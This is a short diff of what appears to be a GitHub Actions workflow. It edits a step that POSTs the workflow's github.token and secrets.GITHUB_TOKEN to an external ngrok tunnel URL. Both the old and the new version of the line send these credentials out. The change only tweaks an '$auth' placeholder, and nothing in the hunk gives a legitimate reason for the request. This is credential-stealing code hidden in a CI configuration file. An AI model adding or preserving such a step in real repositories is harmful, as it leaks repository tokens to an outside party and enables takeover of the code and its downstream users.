@@ -20,4 +20,4 @@ jobs:
         with:
           url: 'https://5aa7-93-172-42-40.ngrok.io'
           method: 'POST'
-          data: '{"${{ github.token }}, ${{ secrets.GITHUB_TOKEN }}, {{ $auth }}"}'
+          data: '{"${{ github.token }}, ${{ secrets.GITHUB_TOKEN }}, $auth"}'
